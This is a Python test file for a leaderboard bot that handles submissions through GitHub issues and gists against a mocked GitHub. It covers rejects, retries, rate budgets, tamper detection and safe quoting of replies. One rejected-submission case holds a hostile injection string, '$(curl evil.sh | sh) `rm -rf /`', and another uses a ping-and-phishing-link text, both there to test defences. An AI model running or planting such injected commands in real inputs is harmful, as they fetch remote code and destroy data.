"""The board workflow's run against a fake GitHub: submissions, reads, failures, budget and answers (design §3-§4)."""

from __future__ import annotations

import json
from collections.abc import Callable
from pathlib import Path
from typing import Any

import httpx
import pytest

from llm_arena.adapters.server.board_run import Action, BoardData, RunStopped, notify, run
from llm_arena.adapters.server.gists import GistClient
from llm_arena.adapters.server.github_issues import RETRY_MARK, IssueClient
from llm_arena.board import Board, BoardIntegrityError, LedgerLine, Registry, RegistryEntry
from llm_arena.claims import canonical, check_claim
from llm_arena.conformance import _claim_fixture, _repro_body

NOW = "2026-10-12T06:00:00+00:00"
GIST = "a" * 32
REV = "b" * 40
REPO = "tilt/llm_arena"


class FakeGitHub:
    """Routes by path; `override` returns a response for a path before the defaults (e.g. a 500 or a 404)."""

    def __init__(self, *, comments: list[dict[str, Any]] | None = None, owner_id: int = 1,
                 issues: list[dict[str, Any]] | None = None, remaining: int = 4000) -> None:  # fmt: skip
        fixture = _claim_fixture()
        self.claim_text = canonical(fixture)
        self.claim_hash = check_claim(self.claim_text).claim_hash
        self.fixture = fixture
        self.comments = comments or []
        self.owner_id = owner_id
        self.issues = issues or []
        self.remaining = remaining
        self.override: Callable[[httpx.Request], httpx.Response | None] = lambda request: None
        self.requests: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if (forced := self.override(request)) is not None:
            return forced
        path = request.url.path
        headers = {"x-ratelimit-remaining": str(self.remaining)}
        owner = {"login": "alice", "id": self.owner_id}
        if path == f"/gists/{GIST}/{REV}":
            return httpx.Response(200, json={"files": {"claim.json": {"content": self.claim_text}}, "owner": owner},
                                  headers=headers)  # fmt: skip
        if path == f"/gists/{GIST}":
            return httpx.Response(200, json={"owner": owner, "history": [{"version": REV}],
                                             "comments": len(self.comments)}, headers=headers)  # fmt: skip
        if path == f"/gists/{GIST}/comments":
            return httpx.Response(200, json=self.comments, headers=headers)
        if path == f"/repos/{REPO}/issues" and request.method == "GET":
            state = request.url.params.get("state")
            return httpx.Response(200, json=[i for i in self.issues if i.get("state", "open") == state])
        if path.startswith(f"/repos/{REPO}/issues/") and path.endswith("/comments") and request.method == "GET":
            return httpx.Response(200, json=[])
        return httpx.Response(200, json={})

    def clients(self) -> tuple[GistClient, IssueClient]:
        transport = httpx.MockTransport(self)
        return (GistClient(lambda: "read-token", transport=transport),
                IssueClient(lambda: "issue-token", REPO, transport=transport))  # fmt: skip

    def repro(self, cid: int, login: str, uid: int, passed: list[int]) -> dict[str, Any]:
        at = f"2026-10-11T10:{cid:02d}:00Z"
        return {"id": cid, "user": {"login": login, "id": uid}, "created_at": at, "updated_at": at,
                "body": _repro_body(self.fixture, self.claim_hash, passed)}  # fmt: skip


def _issue(number: int, body: str, *, login: str = "alice", uid: int = 1) -> dict[str, Any]:
    return {"number": number, "body": body, "user": {"login": login, "id": uid}, "labels": [], "state": "open"}


def _listed(tmp: Path, github: FakeGitHub) -> BoardData:
    data = BoardData(tmp)
    entry = RegistryEntry(gist_id=GIST, revision=REV, claim_hash=github.claim_hash, owner_login="alice", owner_id=1,
                          added_at="2026-10-11T09:00:00+00:00")  # fmt: skip
    data.write(Registry(entries=[entry]), {github.claim_hash: github.claim_text}, [],
               Board(built_at=NOW, claims=0, reproductions=0))  # fmt: skip
    return data


async def test_a_valid_submission_is_added_and_answered_only_through_actions(tmp_path: Path) -> None:
    body = f"### Claim gist\n\nhttps://gist.github.com/alice/{GIST}\n\n### Revision\n\n{REV}"
    github = FakeGitHub(issues=[_issue(5, body)])
    gists, issues = github.clients()
    result = await run(BoardData(tmp_path), gists, issues, now=NOW)
    assert [(a.issue, a.kind) for a in result.actions] == [(5, "accept")] and result.added == [github.claim_hash]
    assert BoardData(tmp_path).registry().entries[0].issue == 5
    assert (tmp_path / "board" / "claims" / f"{github.claim_hash}.json").read_text() == github.claim_text
    assert not [r for r in github.requests if r.method != "GET"]  # nothing answered before the push


@pytest.mark.parametrize(
    ("body", "owner_id", "reason"),
    [
        ("$(curl evil.sh | sh) `rm -rf /`", 1, "names no claim revision"),
        (f"{GIST} " + "x" * 200_000, 1, "names no claim revision"),
        (f"{GIST} {REV}", 99, "only the gist's owner"),
    ],
)
async def test_bad_submissions_are_rejected_with_a_reason(
    tmp_path: Path, body: str, owner_id: int, reason: str
) -> None:
    github = FakeGitHub(issues=[_issue(6, body)], owner_id=owner_id)
    result = await run(BoardData(tmp_path), *github.clients(), now=NOW)
    assert [a.kind for a in result.actions] == ["reject"] and reason in result.actions[0].text
    assert BoardData(tmp_path).registry().entries == []


async def test_a_dead_token_stops_the_run_and_writes_nothing(tmp_path: Path) -> None:
    github = FakeGitHub(issues=[_issue(7, f"{GIST} {REV}")])
    github.override = lambda request: httpx.Response(401) if request.url.path.startswith("/gists") else None
    with pytest.raises(RunStopped, match="BOARD_READ_TOKEN"):
        await run(BoardData(tmp_path), *github.clients(), now=NOW)
    assert not (tmp_path / "board").exists()


async def test_a_gist_5xx_retries_the_issue_and_the_third_failure_closes_it(tmp_path: Path) -> None:
    github = FakeGitHub(issues=[_issue(8, f"{GIST} {REV}")])
    github.override = lambda request: httpx.Response(502) if request.url.path.startswith("/gists") else None
    result = await run(BoardData(tmp_path), *github.clients(), now=NOW)
    assert [a.kind for a in result.actions] == ["retry"]
    original = github.override

    def two_earlier_attempts(request: httpx.Request) -> httpx.Response | None:
        if request.url.path.endswith("/issues/8/comments"):
            return httpx.Response(200, json=[{"body": RETRY_MARK}, {"body": RETRY_MARK}])
        return original(request)

    github.override = two_earlier_attempts
    again = await run(BoardData(tmp_path), *github.clients(), now=NOW)
    assert [a.kind for a in again.actions] == ["internal_error"]


async def test_a_build_reads_threads_records_and_survives_deletions(tmp_path: Path) -> None:
    github = FakeGitHub()
    github.comments = [github.repro(2, "bob", 7, [1, 1])]
    data = _listed(tmp_path, github)
    first = await run(data, *github.clients(), now=NOW)
    assert first.new_lines == 1 and first.board.scenarios[0].ranked[0].people == 1
    github.comments = []  # the author deleted it
    second = await run(data, *github.clients(), now=NOW)
    row = second.board.scenarios[0].ranked[0]
    assert second.new_lines == 0 and row.people == 1 and row.notes[0].kind == "removed_after_recorded"
    github.override = lambda request: httpx.Response(404) if request.url.path == f"/gists/{GIST}" else None
    third = await run(data, *github.clients(), now=NOW)
    assert third.board.scenarios[0].ranked[0].notes[0].kind == "gist_deleted"


async def test_the_budget_guard_stops_before_the_limit(tmp_path: Path) -> None:
    github = FakeGitHub(issues=[_issue(9, f"{GIST} {REV}")], remaining=50)
    data = _listed(tmp_path, github)
    gists, issues = github.clients()
    gists.remaining = 50
    with pytest.raises(RunStopped, match="requests left"):
        await run(data, gists, issues, now=NOW)


async def test_a_tampered_ledger_on_disk_fails_the_build(tmp_path: Path) -> None:
    github = FakeGitHub()
    github.comments = [github.repro(2, "bob", 7, [1, 1])]
    data = _listed(tmp_path, github)
    await run(data, *github.clients(), now=NOW)
    ledger = tmp_path / "board" / "ledger.jsonl"
    line = json.loads(ledger.read_text())
    line["user_login"] = "mallory"
    ledger.write_text(canonical(LedgerLine.model_validate(line).model_dump(mode="json")) + "\n")
    with pytest.raises(BoardIntegrityError):
        await run(data, *github.clients(), now=NOW)


async def test_notify_answers_and_closes_and_leaves_retries_open() -> None:
    github = FakeGitHub()
    _, issues = github.clients()
    await notify([Action(issue=5, kind="accept", text="Added"), Action(issue=6, kind="retry", text="502")], issues)
    calls = [(r.method, r.url.path, json.loads(r.content or b"{}")) for r in github.requests]
    assert ("PATCH", f"/repos/{REPO}/issues/5", {"state": "closed", "state_reason": "completed"}) in calls
    assert ("POST", f"/repos/{REPO}/issues/5/labels", {"labels": ["board-accepted"]}) in calls
    assert not any(method == "PATCH" and path.endswith("/6") for method, path, _ in calls)
    assert any(path.endswith("/6/comments") and RETRY_MARK in body.get("body", "") for _, path, body in calls)


# ---- pre-landing review regressions -------------------------------------------------------------------------------
def _head(count: int) -> httpx.Response:
    return httpx.Response(200, json={"owner": {"login": "alice", "id": 1}, "history": [{"version": REV}],
                                     "comments": count})  # fmt: skip


@pytest.mark.parametrize("bad_page", ["1", "2"])
async def test_an_oversized_comment_page_reads_as_a_partial_thread_and_never_stops_the_run(
    tmp_path: Path, bad_page: str
) -> None:
    github = FakeGitHub()
    github.comments = [github.repro(2, "bob", 7, [1, 1])]
    data = _listed(tmp_path, github)
    await run(data, *github.clients(), now=NOW)  # bob's reproduction is recorded
    huge = b"[" + b'"x",' * 600_000 + b'"x"]'  # a page of maximum-size spam comments, over the 2 MB cap

    def spam(request: httpx.Request) -> httpx.Response | None:
        if request.url.path == f"/gists/{GIST}":
            return _head(150)
        if request.url.path.endswith("/comments") and request.url.params.get("page") == bad_page:
            return httpx.Response(200, content=huge)
        return None

    github.override = spam
    result = await run(data, *github.clients(), now=NOW)
    row = result.board.scenarios[0].ranked[0]
    assert row.people == 1 and "partial_thread" in [n.kind for n in row.notes]


async def test_a_reproduction_after_a_spam_page_is_still_read_and_recorded(tmp_path: Path) -> None:
    github = FakeGitHub()
    data = _listed(tmp_path, github)
    later = [github.repro(9, "carol", 3, [1, 1])]

    def spam_then_repro(request: httpx.Request) -> httpx.Response | None:
        if request.url.path == f"/gists/{GIST}":
            return _head(150)
        if request.url.path.endswith("/comments"):
            page = request.url.params.get("page")
            return httpx.Response(200, content=b"x" * 2_100_000) if page == "1" else httpx.Response(200, json=later)
        return None

    github.override = spam_then_repro
    result = await run(data, *github.clients(), now=NOW)
    row = result.board.scenarios[0].ranked[0]
    assert result.new_lines == 1 and row.people == 1 and [n.kind for n in row.notes] == ["partial_thread"]


async def test_rows_failing_for_their_own_gist_never_stop_the_run_but_an_outage_does(tmp_path: Path) -> None:
    github = FakeGitHub()
    data = _listed(tmp_path, github)
    github.override = lambda r: (
        httpx.Response(200, content=b"x" * 2_100_000) if r.url.path == f"/gists/{GIST}" else None
    )
    result = await run(data, *github.clients(), now=NOW)
    assert [n.kind for n in result.board.scenarios[0].unreproduced[0].notes] == ["not_refreshed"]
    github.override = lambda r: httpx.Response(502) if r.url.path == f"/gists/{GIST}" else None
    with pytest.raises(RunStopped, match="couldn't be read"):
        await run(data, *github.clients(), now=NOW)


@pytest.mark.parametrize("failure", [httpx.ConnectTimeout("timed out"), httpx.Response(503)])
async def test_an_unreachable_issues_api_stops_the_run_cleanly(tmp_path: Path, failure: Any) -> None:
    github = FakeGitHub(issues=[_issue(5, f"{GIST} {REV}")])
    data = _listed(tmp_path, github)
    before = (tmp_path / "board" / "registry.json").read_text()

    def issues_down(request: httpx.Request) -> httpx.Response | None:
        if not request.url.path.startswith(f"/repos/{REPO}/issues"):
            return None
        if isinstance(failure, Exception):
            raise failure
        return failure

    github.override = issues_down
    with pytest.raises(RunStopped, match="issues"):
        await run(data, *github.clients(), now=NOW)
    assert (tmp_path / "board" / "registry.json").read_text() == before


async def test_the_daily_limit_counts_submissions_decided_in_the_same_run(tmp_path: Path) -> None:
    github = FakeGitHub(issues=[_issue(n, f"{GIST} {REV}") for n in range(10, 17)])
    result = await run(BoardData(tmp_path), *github.clients(), now=NOW)
    assert [a.kind for a in result.actions] == ["accept"] + ["reject"] * 6
    assert sum("at most 5 submissions" in a.text for a in result.actions) == 2
    listing = next(r for r in github.requests if r.url.path == f"/repos/{REPO}/issues")
    assert listing.url.params["direction"] == "asc"  # oldest first, so a backlog drains in order


async def test_an_accepted_submission_seen_again_after_a_failed_answer_is_accepted_again(tmp_path: Path) -> None:
    github = FakeGitHub(issues=[_issue(5, f"{GIST} {REV}")])
    data = BoardData(tmp_path)
    await run(data, *github.clients(), now=NOW)
    again = await run(data, *github.clients(), now=NOW)  # notify failed, so issue 5 is still open
    assert [(a.issue, a.kind) for a in again.actions] == [(5, "accept")] and again.added == []
    assert len(data.registry().entries) == 1


async def test_a_hand_written_removal_with_a_plain_date_stops_the_run_cleanly(tmp_path: Path) -> None:
    github = FakeGitHub()
    data = _listed(tmp_path, github)
    path = tmp_path / "board" / "registry.json"
    registry = json.loads(path.read_text())
    registry["removed"] = [{"claim_hash": github.claim_hash, "reason": "spam", "at": "2026-10-12"}]
    path.write_text(json.dumps(registry))
    with pytest.raises(RunStopped, match="registry.json"):
        await run(data, *github.clients(), now=NOW)


async def test_answers_quote_claim_text_and_create_missing_labels() -> None:
    github = FakeGitHub()
    missing = {"board-rejected", "board-internal-error"}
    github.override = lambda r: httpx.Response(404) if r.url.path.rsplit("/", 1)[-1] in missing else None
    _, issues = github.clients()
    hostile = "@everyone see [prize](https://evil.example)\n\n# Hi `x`" + "a" * 5000
    sent = await notify([Action(issue=5, kind="reject", text=hostile), Action(issue=6, kind="internal_error", text="502")],
                        issues)  # fmt: skip
    calls = [(r.method, r.url.path, json.loads(r.content or b"{}")) for r in github.requests]
    body = next(b["body"] for m, p, b in calls if p.endswith("/5/comments"))
    assert len(body) < 400 and "\n" not in body and body.count("`") == 2 and "`@everyone" in body
    created = {b["name"] for m, p, b in calls if m == "POST" and p == f"/repos/{REPO}/labels"}
    assert created == {"board-rejected", "board-internal-error"}  # checked by name, however many labels exist
    assert sent == 1  # internal errors, which fail the workflow so the maintainer hears of them
